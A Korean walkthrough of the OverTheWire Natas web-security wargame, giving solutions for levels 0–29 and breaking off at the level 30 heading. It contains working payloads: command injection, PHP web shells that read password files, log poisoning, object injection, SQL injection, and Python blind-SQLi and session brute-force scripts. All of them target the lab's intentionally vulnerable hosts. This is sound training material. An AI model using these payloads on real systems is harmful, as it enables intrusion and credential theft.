# OverTheWire Natas 해설

OverTheWire의 서버 사이드 웹 보안 워게임 **Natas** 전체 레벨(0–34) 풀이입니다. 레벨별 목표, 풀이 순서, 핵심 개념을 정리했습니다.

비밀번호 값은 서버에서 주기적으로 교체되므로 적지 않았습니다. 각 레벨에서 직접 얻은 값을 기록하면서 진행하세요.

## 레벨 맵

| 파트 | 레벨 | 키워드 |
|---|---|---|
| 기초 | 0–8 | 소스 보기, `robots.txt`, Referer, 쿠키, LFI |
| 인젝션 | 9–14 | 커맨드 인젝션, XOR, 파일 업로드, SQLi |
| 블라인드 | 15–17 | Blind SQLi, `$()`, `SLEEP()` |
| 세션·인증 | 18–24 | 세션 ID, 세션 파일, 비교 우회 |
| 심화 | 25–28 | 로그 포이즈닝, 객체 주입, MySQL, ECB |
| Perl·Phar | 29–33 | `open()`, `quote()`, `ARGV`, Phar |
| 완주 | 34 | 끝 |

## 시작하기

### 접속

- 주소: `http://natasX.natas.labs.overthewire.org`
- 아이디: `natasX`
- 비밀번호: 이전 레벨에서 얻은 값 (시작은 `natas0` / `natas0`)
- HTTP Basic Auth 창이 뜨면 그대로 입력하면 됩니다.
- SSH 로그인은 없습니다. 전부 웹에서 해결합니다.

### 구조

- 모든 비밀번호는 `/etc/natas_webpass/natasX`에 있습니다.
- 예: `natas5`의 비밀번호는 `/etc/natas_webpass/natas5`에 있고, `natas4`와 `natas5`만 읽을 수 있습니다.
- 즉, **다음 레벨 번호의 파일**을 읽으면 됩니다.

### 도구

| 도구 | 용도 |
|---|---|
| 브라우저 개발자도구 (F12) | 소스 보기, 쿠키 수정, 네트워크 확인 |
| Burp Suite (Repeater) | 요청 헤더·바디·쿠키 변조 |
| curl | 간단한 요청, 헤더/쿠키 지정 |
| Python + requests | 브루트포스, 자동화 |

### curl 기본형

```bash
# 기본 인증 + GET
curl -u 'natasX:비밀번호' http://natasX.natas.labs.overthewire.org/

# 헤더 추가 (예: Referer)
curl -u 'natasX:비밀번호' \
     -H 'Referer: http://natas4.natas.labs.overthewire.org/' \
     http://natas4.natas.labs.overthewire.org/

# 쿠키 지정
curl -u 'natasX:비밀번호' -b 'loggedin=1' \
     http://natasX.natas.labs.overthewire.org/
```

> 비밀번호에 특수문자가 있으면 작은따옴표로 감싸면 편합니다.

## 레벨별 풀이

각 레벨은 **목표 → 풀이 → 개념** 순서로 정리했습니다.

### Part 1 · 기초 (natas0–8)

#### natas0 → natas1

`소스 보기` · ★☆☆

페이지에 숨겨진 비밀번호를 찾습니다.

1. `http://natas0.natas.labs.overthewire.org`에 접속합니다.
2. `Ctrl+U` 또는 F12로 HTML 소스를 봅니다.
3. 주석 안에서 다음 레벨 비밀번호를 확인합니다.

```html
<!--The password for natas1 is ... -->
```

> **개념** — 화면에 보이는 것이 전부가 아닙니다. HTML 주석, 숨겨진 input, JS 파일 안에 정보가 남아 있는 경우가 많습니다.

#### natas1 → natas2

`소스 보기` · ★☆☆

우클릭 차단을 우회해 소스를 봅니다.

1. 페이지에서 우클릭이 막혀 있습니다.
2. 다음 중 하나를 사용합니다.
   - `Ctrl+U`
   - F12 → Elements / Sources
   - 주소창에 `view-source:http://natas1.natas.labs.overthewire.org/`
3. 주석에서 natas2 비밀번호를 확인합니다.

> **개념** — 우클릭 차단은 자바스크립트일 뿐입니다. 브라우저 기능이나 개발자도구로 우회할 수 있습니다.

#### natas2 → natas3

`디렉터리 리스팅` · ★☆☆

`/files/`의 숨은 파일을 찾습니다.

1. 소스에서 `files/pixel.png` 같은 이미지 경로를 확인합니다.
2. `/files/`로 접속합니다.
3. 디렉터리 목록이 나오면 `users.txt`를 엽니다.
4. `users.txt` 안에 natas3 비밀번호가 있습니다.

> **개념** — 디렉터리 인덱싱이 켜져 있으면 링크되지 않은 파일까지 전부 볼 수 있습니다. `index.html`이 없는 디렉터리에서 자주 발생합니다.

#### natas3 → natas4

`robots.txt` · ★☆☆

검색엔진이 숨긴 디렉터리를 찾습니다.

1. 소스의 "Not even Google will find it this time" 힌트를 봅니다.
2. `/robots.txt`에 접속합니다.
3. `Disallow: /s3cr3t/`를 확인합니다.
4. `/s3cr3t/`로 접속해 `users.txt`를 엽니다.

```text
User-agent: *
Disallow: /s3cr3t/
```

> **개념** — `robots.txt`는 검색엔진 크롤러에게 "이 경로는 수집하지 마세요"라고 알려주는 파일입니다. **보안 장치가 아니며**, 여기에 적힌 경로가 오히려 힌트가 됩니다.

#### natas4 → natas5

`Referer` · ★☆☆

`Referer` 검사를 우회합니다.

1. 메시지에서 허용된 Referer가 `http://natas4.natas.labs.overthewire.org/`임을 확인합니다.
2. Burp Suite로 요청을 잡아 `Referer`를 그 값으로 바꿉니다.
   - Proxy → History → 요청 우클릭 → Send to Repeater
   - Repeater에서 `Referer:` 수정 → Send
3. 또는 curl을 사용합니다.

```bash
curl -u 'natas4:비밀번호' \
     -H 'Referer: http://natas4.natas.labs.overthewire.org/' \
     http://natas4.natas.labs.overthewire.org/
```

> **개념** — `Referer`는 브라우저가 "어떤 페이지에서 요청했는지" 알려주는 헤더입니다. 사용자가 조작할 수 있으므로 접근 제어에 쓰면 안 됩니다.

#### natas5 → natas6

`쿠키` · ★☆☆

`loggedin` 쿠키를 바꿉니다.

1. 접속하면 "You are not logged in"이 나옵니다.
2. 개발자도구 → Application(또는 Storage) → Cookies에서 `loggedin=0`을 확인합니다.
3. 값을 `1`로 바꾸고 새로고침합니다.
4. 또는 curl로 쿠키를 지정합니다.

```bash
curl -u 'natas5:비밀번호' -b 'loggedin=1' \
     http://natas5.natas.labs.overthewire.org/
```

> **개념** — 로그인 상태를 쿠키 값 하나로 판단하면, 사용자가 그 값을 바꿔 관리자처럼 행동할 수 있습니다.

#### natas6 → natas7

`include` · ★☆☆

`secret.inc` 파일을 읽습니다.

1. 폼에 secret을 입력하라고 합니다.
2. 소스에서 `include "includes/secret.inc";`를 확인합니다.
3. `/includes/secret.inc`에 직접 접속합니다.
4. `$secret = "...";` 값을 폼에 입력합니다.

> **개념** — `.inc` 확장자는 PHP가 실행하도록 설정되지 않은 경우가 많아 소스가 그대로 노출됩니다. 비밀값을 include 파일에 넣는 것은 안전하지 않습니다.

#### natas7 → natas8

`LFI` · ★☆☆

`page` 파라미터로 비밀번호 파일을 읽습니다.

1. 페이지에 `?page=home` 구조가 있습니다.
2. 소스 주석에서 "password for webuser natas8 is in `/etc/natas_webpass/natas8`" 힌트를 확인합니다.
3. `page` 값에 해당 경로를 넣습니다.

```text
http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8
```

> **개념** — 사용자 입력이 `include`, `require`, `file_get_contents`에 들어가면 서버의 아무 파일이나 읽을 수 있습니다. `../`로 상위 디렉터리로 이동하는 것을 **path traversal**이라고 합니다.

#### natas8 → natas9

`인코딩` · ★☆☆

`hex2bin → strrev → base64_decode` 순서로 secret을 복원합니다.

1. 소스에서 `$encodedSecret`와 `encodeSecret()`을 확인합니다.

```php
$encodedSecret = "3d3d516343746d4d6d6c315669563362";
function encodeSecret($secret) {
    return bin2hex(strrev(base64_encode($secret)));
}
```

2. 인코딩의 역순으로 디코드합니다.

```bash
php -r 'echo base64_decode(strrev(hex2bin("3d3d516343746d4d6d6c315669563362")));'
```

3. 출력되는 secret(`oubWYf2kBq`)을 폼에 입력합니다.

> **개념** — 인코딩은 암호화가 아닙니다. 순서만 알면 누구나 되돌릴 수 있습니다.

### Part 2 · 인젝션 (natas9–14)

#### natas9 → natas10

`커맨드 인젝션` · ★★☆

`passthru()`에 `;`로 명령을 이어 붙입니다.

1. 소스에서 아래 코드를 확인합니다.

```php
passthru("grep -i $key dictionary.txt");
```

2. `$key`가 따옴표로 감싸지지 않았으므로 셸 명령을 추가할 수 있습니다.

```text
    ; cat /etc/natas_webpass/natas10 #
```

3. URL 인코딩해서 보냅니다. (`#`은 `%23`)

```text
http://natas9.natas.labs.overthewire.org/?key=%3B%20cat%20/etc/natas_webpass/natas10%20%23&submit=Search
```

> **개념** — `;`는 명령 구분자, `#`은 주석입니다. `grep ... ; cat ... # dictionary.txt`가 되어 cat이 실행됩니다.

#### natas10 → natas11

`grep 인자` · ★★☆

`;`, `|`, `&` 필터를 grep의 파일 인자로 우회합니다.

1. natas10은 `;`, `|`, `&`를 필터링합니다.
2. 하지만 `$key`는 여전히 따옴표 없이 명령에 들어갑니다.

```php
passthru("grep -i $key dictionary.txt");
```

3. grep은 `grep [옵션] 패턴 파일1 파일2 ...` 형식이므로, 패턴 뒤에 파일을 추가할 수 있습니다.

```text
.* /etc/natas_webpass/natas11
```

4. 실제 실행되는 명령은 다음과 같습니다.

```bash
grep -i .* /etc/natas_webpass/natas11 dictionary.txt
```

5. `.*`가 모든 줄과 매칭되어 두 파일의 내용이 전부 출력됩니다.

> **개념** — 필터가 모든 메타문자를 막지 못하면 우회할 수 있습니다. 여기서는 `;` 없이 grep의 인자 구조만으로 파일을 읽었습니다.

#### natas11 → natas12

`XOR 쿠키` · ★★☆

known plaintext로 키를 복원하고 쿠키를 위조합니다.

1. 쿠키 `data`는 대략 `base64_encode(xor_encrypt(json_encode($d)))` 형태입니다.
2. 기본 데이터는 `{"showpassword":"no","bgcolor":"#ffffff"}`이고, 목표는 `showpassword`를 `yes`로 바꾸는 것입니다.
3. base64 디코드한 쿠키와 known plaintext를 XOR 해 반복 키를 찾습니다.

```python
import base64

cookie_b64 = "여기에 현재 data 쿠키 값"
cipher = base64.b64decode(cookie_b64)

known = b'{"showpassword":"no","bgcolor":"#ffffff"}'
key_stream = bytes(c ^ p for c, p in zip(cipher, known))
print(key_stream)   # qw8Jqw8J... 처럼 반복되는지 확인
```

4. 반복 키(예: `qw8J`)를 구한 뒤, `showpassword`를 `yes`로 바꾼 JSON을 같은 키로 XOR 합니다.

```python
import base64, json

key = b"qw8J"  # 위에서 확인한 반복 키
plain = json.dumps(
    {"showpassword": "yes", "bgcolor": "#ffffff"},
    separators=(",", ":")
).encode()

out = bytes(plain[i] ^ key[i % len(key)] for i in range(len(plain)))
print(base64.b64encode(out).decode())
```

5. 출력값을 `data` 쿠키에 넣고 새로고침합니다.

> **개념** — XOR 암호는 키가 반복되면 known plaintext만으로 키를 복원할 수 있습니다. 암호화 키를 쿠키에 숨겨 두는 것은 의미가 없습니다.

#### natas12 → natas13

`파일 업로드` · ★★☆

PHP 웹셸을 업로드합니다.

1. 이미지 업로드 폼이 있고, 업로드 후 `/upload/...` 경로를 알려줍니다.
2. 소스에서 저장 파일명의 확장자를 `$_POST["filename"]`에서 가져오는 것을 확인합니다.
3. 아래 내용을 `shell.php`로 저장합니다.

```php
<?php echo file_get_contents('/etc/natas_webpass/natas13'); ?>
```

4. 업로드 요청을 Burp로 잡아 숨겨진 `filename` 값을 `shell.php`로 바꿉니다.
5. 업로드 후 표시되는 `/upload/shell.php`에 접속합니다.

> **개념** — 업로드 파일을 웹 루트 안에 저장하고 확장자를 사용자 입력으로 정하면 PHP 코드가 실행됩니다. 업로드 디렉터리에는 실행 권한을 주면 안 됩니다.

#### natas13 → natas14

`매직 바이트` · ★★☆

`exif_imagetype()` 검사를 GIF 시그니처로 우회합니다.

1. natas13은 업로드 파일에 `exif_imagetype()` 검사를 추가했습니다.
2. PHP 코드 앞에 GIF 시그니처를 붙입니다.

```php
GIF89a;<?php echo file_get_contents('/etc/natas_webpass/natas14'); ?>
```

3. 위 내용을 `shell.php`로 저장하고, natas12와 같이 `filename`을 `shell.php`로 바꿔 업로드합니다.
4. `/upload/shell.php`에 접속하면 PHP 부분이 실행됩니다.

> **개념** — `exif_imagetype()`은 파일 앞부분의 시그니처만 확인합니다. `GIF89a` 같은 매직 바이트를 붙이면 통과합니다.

#### natas14 → natas15

`SQL Injection` · ★★☆

로그인 쿼리를 `OR 1=1`로 우회합니다.

1. 소스의 쿼리를 확인합니다.

```php
$query = "SELECT * FROM users WHERE username=\"$username\" AND password=\"$password\"";
```

2. `username`에 `" OR 1=1 -- `를 넣고 `password`는 아무 값이나 넣습니다.

```text
username=natas15" OR 1=1 -- 
password=x
```

3. `-- ` 뒤의 공백까지 있어야 주석으로 인식됩니다.

```bash
curl -u 'natas14:비밀번호' \
     --data-urlencode 'username=natas15" OR 1=1 -- ' \
     --data-urlencode 'password=x' \
     http://natas14.natas.labs.overthewire.org/
```

> **개념** — 쿼리에 입력값을 그대로 이어 붙이면 `OR 1=1` 같은 조건을 추가해 인증을 우회할 수 있습니다. Prepared Statement를 써야 하는 이유입니다.

### Part 3 · 블라인드 (natas15–17)

#### natas15 → natas16

`Blind SQLi` · ★★☆

`LIKE BINARY`로 비밀번호를 한 글자씩 추출합니다.

1. natas15는 사용자 존재 여부만 알려줍니다. ("This user exists.")
2. 소스의 쿼리는 `SELECT * FROM users WHERE username="$username"` 형태입니다.
3. `natas16` 사용자가 존재하는지 확인하고, `AND`로 비밀번호 조건을 붙입니다.

```text
natas16" AND password LIKE BINARY "a%" -- 
```

4. "This user exists."가 나오면 비밀번호가 `a`로 시작하는 것입니다.
5. 32글자에 대해 반복합니다.

```python
import requests, string
from requests.auth import HTTPBasicAuth

URL = "http://natas15.natas.labs.overthewire.org/index.php"
AUTH = HTTPBasicAuth("natas15", "여기에_비밀번호")

chars = string.digits + string.ascii_letters
pw = ""

while True:
    found = False
    for c in chars:
        payload = f'natas16" AND password LIKE BINARY "{pw + c}%" -- '
        r = requests.post(URL, data={"username": payload}, auth=AUTH)
        if "This user exists" in r.text:
            pw += c
            found = True
            print(pw)
            break
    if not found:
        break

print("password:", pw)
```

> **개념** — 값이 직접 출력되지 않아도 참/거짓 응답 차이를 이용하면 한 글자씩 알아낼 수 있습니다. `BINARY`는 대소문자를 구분하기 위해 붙입니다.

#### natas16 → natas17

`명령 치환` · ★★★

`$()`와 grep으로 blind 추출합니다.

1. 소스는 대략 다음과 같습니다.

```php
passthru("grep -i \"$key\" dictionary.txt");
```

2. `;`, `|`, `&`, 백틱, 따옴표는 필터링되지만 `$()`는 남아 있습니다.
3. `$()` 안의 명령 결과가 grep 패턴에 들어갑니다.

```text
$(grep a /etc/natas_webpass/natas17)zigzag
```

4. 동작 원리
   - 비밀번호에 `a`가 있으면 `$(...)` 결과가 비밀번호가 되어 패턴이 `<비밀번호>zigzag`가 됩니다. 사전에 이런 단어는 없으므로 **출력이 없습니다.**
   - `a`가 없으면 `$(...)`가 빈 문자열이 되어 `grep -i "zigzag" dictionary.txt`가 실행되고 **zigzag가 출력됩니다.**

5. 즉, 응답에 `zigzag`가 **없으면** 그 글자가 비밀번호에 포함된 것입니다.
6. 사용 가능한 문자 집합을 찾은 뒤, 접두사를 늘려가며 복원합니다.

```python
import requests, string
from requests.auth import HTTPBasicAuth

URL = "http://natas16.natas.labs.overthewire.org/"
AUTH = HTTPBasicAuth("natas16", "여기에_비밀번호")
chars = string.digits + string.ascii_letters

# 1) 비밀번호에 포함된 문자 찾기
valid = ""
for c in chars:
    payload = f"$(grep {c} /etc/natas_webpass/natas17)zigzag"
    r = requests.get(URL, params={"needle": payload, "submit": "Search"}, auth=AUTH)
    if "zigzag" not in r.text:
        valid += c
print("valid chars:", valid)

# 2) 접두사 늘려가며 32글자 복원
pw = ""
while len(pw) < 32:
    for c in valid:
        payload = f"$(grep ^{pw + c} /etc/natas_webpass/natas17)zigzag"
        r = requests.get(URL, params={"needle": payload, "submit": "Search"}, auth=AUTH)
        if "zigzag" not in r.text:
            pw += c
            print(pw)
            break
    else:
        break

print("password:", pw)
```

> **개념** — 명령 치환 `$()`가 필터에서 빠져 있으면 명령 실행으로 이어집니다. `^`를 붙이면 grep이 접두사 매칭이 되어 더 안정적으로 추출할 수 있습니다.

#### natas17 → natas18

`Time-based` · ★★☆

`SLEEP()`으로 참/거짓을 판별합니다.

1. natas17은 natas15와 거의 같지만 결과 메시지가 전부 주석 처리되어 있습니다.
2. 조건이 참이면 `SLEEP(2)`가 실행되도록 합니다.

```text
username=natas18" AND IF(BINARY substring(password,1,1)="a", SLEEP(2), 0) -- 
```

3. 응답 시간이 2초 이상이면 그 글자가 맞습니다.

```python
import requests, string
from requests.auth import HTTPBasicAuth

URL = "http://natas17.natas.labs.overthewire.org/index.php"
AUTH = HTTPBasicAuth("natas17", "여기에_비밀번호")
chars = string.digits + string.ascii_letters
pw = ""

for n in range(1, 33):
    for c in chars:
        payload = (
            'natas18" AND IF(BINARY substring(password,1,%d)="%s", SLEEP(2), 0) -- '
            % (n, pw + c)
        )
        r = requests.post(URL, data={"username": payload}, auth=AUTH)
        if r.elapsed.total_seconds() > 1.5:
            pw += c
            print(pw)
            break

print("password:", pw)
```

> **개념** — 출력이 없어도 시간 차이를 관찰하면 정보를 얻을 수 있습니다. 네트워크 지연과 구분하기 위해 `SLEEP(2)`처럼 넉넉한 값을 씁니다.

### Part 4 · 세션과 인증 (natas18–24)

#### natas18 → natas19

`세션 ID` · ★★☆

작은 정수 세션 ID를 브루트포스합니다.

1. 로그인 폼이 있고 `PHPSESSID`가 `1`, `2`, ... 같은 작은 숫자입니다.
2. 소스에서 `$_SESSION["admin"]`을 확인할 수 있습니다.
3. `1`부터 `640`까지 쿠키를 바꿔가며 요청합니다.

```python
import requests
from requests.auth import HTTPBasicAuth

URL = "http://natas18.natas.labs.overthewire.org/index.php"
AUTH = HTTPBasicAuth("natas18", "여기에_비밀번호")

for i in range(1, 641):
    r = requests.get(URL, auth=AUTH, cookies={"PHPSESSID": str(i)})
    if "You are an admin" in r.text:
        print("admin session:", i)
        print(r.text)
        break
```

> **개념** — 세션 ID가 예측 가능한 숫자면 공격자가 관리자 세션을 찾아 탈취할 수 있습니다. 세션 ID는 충분히 긴 난수여야 합니다.

#### natas19 → natas20

`hex 세션 ID` · ★★☆

`hex(숫자-admin)` 형식의 세션 ID를 브루트포스합니다.

1. 로그인하면 `PHPSESSID`가 `3132332d61646d696e`처럼 16진수 문자열입니다.
2. 디코딩하면 `123-admin` 형태입니다. 즉, `<세션번호>-<username>`을 hex로 인코딩한 것입니다.
3. `1-admin`부터 `640-admin`까지 hex로 만들어 대입합니다.

```python
import requests
from requests.auth import HTTPBasicAuth

URL = "http://natas19.natas.labs.overthewire.org/index.php"
AUTH = HTTPBasicAuth("natas19", "여기에_비밀번호")

for i in range(1, 641):
    sid = (str(i) + "-admin").encode().hex()
    r = requests.post(
        URL,
        data={"username": "admin", "password": "x"},
        auth=AUTH,
        cookies={"PHPSESSID": sid},
    )
    if "You are an admin" in r.text:
        print("admin session:", sid)
        print(r.text)
        break
```

> **개념** — 세션 ID를 단순히 hex로 인코딩하는 것은 보안이 아닙니다. 인코딩은 누구나 되돌릴 수 있습니다.

#### natas20 → natas21

`세션 파일 개행` · ★★☆

세션 파일에 `admin 1` 줄을 주입합니다.

1. 소스에는 직접 만든 세션 저장/읽기 함수가 있습니다.
2. 세션 데이터는 `키 값` 형식의 줄로 저장됩니다.

```text
name test
```

3. `myread()`는 파일을 한 줄씩 읽고, 공백을 기준으로 `$_SESSION[$parts[0]] = $parts[1]`을 합니다.
4. `name` 입력에 개행과 `admin 1`을 넣습니다.

```text
test
admin 1
```

5. Burp로 `name` 값을 URL 인코딩해 보냅니다.

```text
test%0Aadmin%201
```

6. 첫 요청에서 세션 파일이 기록되고, 다음 요청에서 `admin=1`이 읽혀 관리자 권한이 됩니다.

> **개념** — 세션 저장 형식을 직접 구현할 때 구분자(공백, 개행)를 이스케이프하지 않으면 임의의 세션 키를 주입할 수 있습니다.

#### natas21 → natas22

`세션 공유` · ★★☆

같은 세션 저장소를 쓰는 experimenter 사이트를 이용합니다.

1. `natas21`과 `natas21-experimenter`가 세션을 공유합니다.
2. experimenter 사이트에서는 세션 값을 자유롭게 설정할 수 있습니다.
3. experimenter에서 `admin=1`을 설정하고, 같은 `PHPSESSID`로 본 사이트에 접속합니다.

```python
import requests
from requests.auth import HTTPBasicAuth

AUTH = HTTPBasicAuth("natas21", "여기에_비밀번호")
sid = "mysession123"

requests.post(
    "http://natas21-experimenter.natas.labs.overthewire.org/index.php",
    data={"admin": "1", "submit": "1"},
    auth=AUTH,
    cookies={"PHPSESSID": sid},
)

r = requests.get(
    "http://natas21.natas.labs.overthewire.org/index.php",
    auth=AUTH,
    cookies={"PHPSESSID": sid},
)
print(r.text)
```

> **개념** — 같은 세션 저장소를 공유하는데 한쪽 사이트의 입력 검증이 약하면, 다른 사이트의 권한까지 올라갈 수 있습니다.

#### natas22 → natas23

`리다이렉트` · ★☆☆

리다이렉트 응답의 본문을 읽습니다.

1. `?revelio=1`을 붙이면 비밀번호를 출력한 뒤 다른 페이지로 리다이렉트합니다.
2. 브라우저는 리다이렉트를 따라가므로 비밀번호가 사라진 것처럼 보입니다.
3. curl로 리다이렉트를 따라가지 않고 응답 본문을 확인합니다.

```bash
curl -u 'natas22:비밀번호' \
     'http://natas22.natas.labs.overthewire.org/?revelio=1'
```

> **개념** — 리다이렉트는 브라우저의 동작일 뿐, 서버가 이미 보낸 본문을 지우지는 않습니다. Burp Repeater에서도 그대로 볼 수 있습니다.

#### natas23 → natas24

`느슨한 비교` · ★☆☆

문자열과 숫자의 비교를 우회합니다.

1. 소스는 대략 다음과 같습니다.

```php
if (strstr($_REQUEST["passwd"], "iloveyou") && ($_REQUEST["passwd"] > 10)) {
    // 비밀번호 출력
}
```

2. `iloveyou`를 포함하면서 숫자 비교에서 10보다 커야 합니다.
3. `"11iloveyou"`를 넣으면 문자열이 숫자 11로 해석됩니다.

```text
http://natas23.natas.labs.overthewire.org/?passwd=11iloveyou
```

> **개념** — PHP의 느슨한 비교는 문자열을 숫자로 바꿀 수 있으면 숫자로 비교합니다. 그래서 `"11iloveyou" > 10`이 참이 됩니다.

#### natas24 → natas25

`strcmp 배열` · ★☆☆

`strcmp()`에 배열을 전달합니다.

1. 소스는 대략 다음과 같습니다.

```php
if (strcmp($_REQUEST["passwd"], $password) == 0) {
    // 비밀번호 출력
}
```

2. `passwd`에 배열을 넣으면 `strcmp()`가 배열을 받고 결과가 `NULL`이 됩니다.
3. `NULL == 0`은 느슨한 비교에서 참입니다.

```text
http://natas24.natas.labs.overthewire.org/?passwd[]=1
```

> **개념** — PHP 함수가 예상한 타입과 다른 타입을 받을 때 경고만 내고 진행하는 경우가 있습니다. 입력 타입 검증이 중요합니다.

### Part 5 · 심화 (natas25–28)

#### natas25 → natas26

`로그 포이즈닝` · ★★★

LFI로 로그 파일을 include 해 User-Agent의 PHP 코드를 실행합니다.

1. 소스에는 언어 파일을 include 하는 기능이 있습니다.

```php
safeinclude("lang/" . $_REQUEST["lang"]);
```

2. `safeinclude()`는 `../`를 한 번 `str_replace`로 지우고, `natas_webpass`가 들어가면 종료합니다.
3. `....//`를 넣으면 필터가 `../`를 지운 뒤 `../`가 남습니다.

```text
....//  →  ../
```

4. 접근 로그는 `/var/www/natas/natas25/logs/natas25_<PHPSESSID>.log`에 저장되고, 로그에는 **User-Agent**가 그대로 들어갑니다.
5. 먼저 traversal로 로그 파일을 읽어 경로와 형식을 확인합니다.

```text
?lang=....//....//....//....//....//var/www/natas/natas25/logs/natas25_<PHPSESSID>.log
```

6. User-Agent에 PHP 코드를 넣고 같은 요청을 보냅니다.

```http
User-Agent: <?php echo file_get_contents('/etc/natas_webpass/natas26'); ?>
```

7. 로그 파일이 include 되면서 PHP 코드가 실행됩니다.

> **개념** — 로그 파일은 확장자와 상관없이 include 되면 PHP로 실행됩니다. 이를 **로그 포이즈닝**이라고 합니다.
>
> **경로가 안 맞으면** 소스의 `logRequest()`에 적힌 실제 경로를 확인하세요. 서버 구성에 따라 `/var/log/natas/...`일 수도 있습니다.

#### natas26 → natas27

`PHP Object Injection` · ★★★

`unserialize()`와 `__destruct()`로 웹셸을 씁니다.

1. 소스에는 `Logger` 클래스가 있고, `__destruct()`에서 `$logFile`에 `$exitMsg`를 씁니다.

```php
class Logger {
    private $logFile;
    private $initMsg;
    private $exitMsg;

    function __destruct() {
        file_put_contents($this->logFile, $this->exitMsg);
    }
}
```

2. 페이지는 쿠키 `drawing`을 `unserialize(base64_decode(...))` 합니다.
3. `Logger` 객체를 직접 만들어 `$logFile`을 웹에서 접근 가능한 `img/` 아래 PHP 파일로, `$exitMsg`를 웹셸로 설정합니다.

```php
<?php
class Logger {
    private $logFile;
    private $initMsg;
    private $exitMsg;

    function __construct() {
        $this->logFile = "/var/www/natas/natas26/img/shell.php";
        $this->initMsg = "";
        $this->exitMsg = "<?php echo file_get_contents('/etc/natas_webpass/natas27'); ?>";
    }
}

echo base64_encode(serialize(new Logger()));
```

4. 출력된 base64 값을 `drawing` 쿠키에 넣고 새로고침합니다.
5. `__destruct()`가 실행되면서 `/var/www/natas/natas26/img/shell.php`가 생성됩니다.
6. `http://natas26.natas.labs.overthewire.org/img/shell.php`에 접속합니다.

> **개념** — `unserialize()`에 사용자 입력이 들어가면 클래스의 `__wakeup()`/`__destruct()`를 악용해 임의 파일 쓰기·코드 실행이 가능합니다. 이를 **PHP Object Injection**이라고 합니다.
>
> **주의** — private 프로퍼티는 직렬화할 때 null 바이트가 들어갑니다. 반드시 PHP로 serialize 한 결과를 사용하세요.

#### natas27 → natas28

`MySQL truncation` · ★★☆

`varchar(64)` 잘림과 공백 비교를 이용합니다.

1. 소스에는 `users` 테이블이 다음과 같이 정의되어 있습니다.

```sql
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
```

2. `validUser()`는 사용자 존재 여부를 확인하고, 없으면 `createUser()`로 새 사용자를 만듭니다.
3. `checkCredentials()`는 아이디/비밀번호를 확인하고, `dumpData()`는 **아이디만** 기준으로 데이터를 출력합니다.
4. MySQL은 `varchar(64)`를 넘는 값을 뒤에서 잘라 저장하고, 비교할 때 뒤쪽 공백을 무시합니다.
5. `natas28` + 공백 57개 + `x`(총 65자)를 아이디로 가입합니다.

```text
아이디: natas28[공백 57개]x
비밀번호: password
```

6. DB에는 64자로 잘려 `natas28[공백 57개]`가 저장됩니다.
7. `natas28` / `password`로 로그인하면 공백 무시 비교 덕분에 방금 만든 행과 매칭됩니다.
8. `dumpData("natas28")`이 원래 natas28 행의 비밀번호를 출력합니다.

```python
import requests
from requests.auth import HTTPBasicAuth

URL = "http://natas27.natas.labs.overthewire.org/index.php"
AUTH = HTTPBasicAuth("natas27", "여기에_비밀번호")

username = "natas28" + " " * 57 + "x"
requests.post(URL, data={"username": username, "password": "password"}, auth=AUTH)
r = requests.post(URL, data={"username": "natas28", "password": "password"}, auth=AUTH)
print(r.text)
```

> **개념** — 길이 제한과 중복 방지(UNIQUE)가 없으면 잘린 값으로 기존 사용자와 같은 아이디를 만들 수 있습니다. MySQL의 `PAD SPACE` 비교도 함께 작용합니다.
>
> **팁** — 이미 같은 행이 있으면 가입이 실패할 수 있습니다. 비밀번호를 바꿔 다시 시도하거나 잠시 기다렸다가 다시 시도하세요.

#### natas28 → natas29

`AES-ECB` · ★★★

ECB 블록을 재조립해 SQL Injection을 만듭니다.

이 레벨은 Natas에서 가장 어려운 축에 듭니다. 검색어가 암호화되어 `search.php?query=...`로 전달됩니다.

1. 검색하면 `query` 값이 base64로 바뀌고, 디코드하면 16바이트 블록이 보입니다. (AES-ECB)
2. 입력을 한 글자씩 늘리면 암호문 길이가 16바이트 단위로 늘어납니다. 앞쪽 두 블록은 고정 prefix, 뒤쪽은 suffix입니다.
3. `'`는 `\'`로 이스케이프됩니다. 그래서 `A`를 9개 붙여 `\'`가 블록 경계에 걸치게 만듭니다.

```text
AAAAAAAAA' OR 1=1 -- 
```

4. `AAAAAAAAA'`로 만든 암호문에서 **이스케이프가 들어간 3번째 블록**을 확인합니다.
5. 공백 10개로 검색해 **더미 블록**(3번째 블록 자리)을 확보합니다.
6. 첫 2개 블록은 header, 마지막 2개 블록은 trailer로 사용합니다.
7. 다음 순서로 재조립합니다.

```text
[header 2블록] + [더미 블록] + [SQLi가 들어간 블록들] + [trailer 2블록]
```

8. 재조립한 바이트를 base64 → URL 인코딩해서 `query`로 보냅니다.
9. SQLi는 `UNION SELECT`로 users 테이블의 password를 꺼냅니다.

```sql
' UNION SELECT password FROM users -- 
```

> **개념** — ECB는 같은 평문 블록이 항상 같은 암호문 블록이 됩니다. 그래서 블록을 잘라 붙이는 것만으로 원하는 평문을 만들 수 있습니다. (cut-and-paste attack)
>
> **자동화 팁** — POST 응답의 `Location` 헤더에서 `query=` 값을 꺼내 base64 디코드하면 블록을 다루기 쉽습니다. 키나 prefix가 바뀌면 예전 writeup의 고정 블록은 맞지 않으므로, 매번 현재 응답에서 블록을 추출하세요.

### Part 6 · Perl과 Phar (natas29–33)

#### natas29 → natas30

`Perl open pipe` · ★★★

`open()`의 파이프 모드로 명령을 실행합니다.

1. `index.pl?file=...`로 언어 파일을 읽습니다.
2. 소스는 대략 다음과 같습니다.

```perl
if(param('file')){
    $f = param('file');
    if($f =~ /natas/){
        print "meeeeeep!<br>";
    } else {
        open(FD, "$f.txt");
        ...
    }
}
```

3. `open()`의 파일명 앞에 `|`를 붙이면 명령 실행 모드가 됩니다.
4. `natas` 문자열이 필터링되므로 `?` 와일드카드로 우회합니다.
5. `.txt`가 자동으로 붙으므로 `%00`(null byte)로 문자열을 끊습니다.

```text
|cat /etc/n?tas_webpass/n?tas30 %00
```

```bash
curl -u 'natas29:비밀번호' \
  'http://natas29.natas.labs.overthewire.org/index.pl?file=%7Ccat%20/etc/n%3Ftas_webpass/n%3Ftas30%20%00'
```

> **개념** — Perl의 2-arg `open(FD, "명령 |")`는 명령을 실행합니다. 사용자 입력을 파일명으로 넘기면 RCE로 이어집니다.
>
> **소스 확인** — `|cat index.pl | base64 %00`처럼 요청하면 `index.pl` 소스를 base64로 받아 볼 수 있습니다.

#### natas30 → natas31

`DBI quote` · ★★★

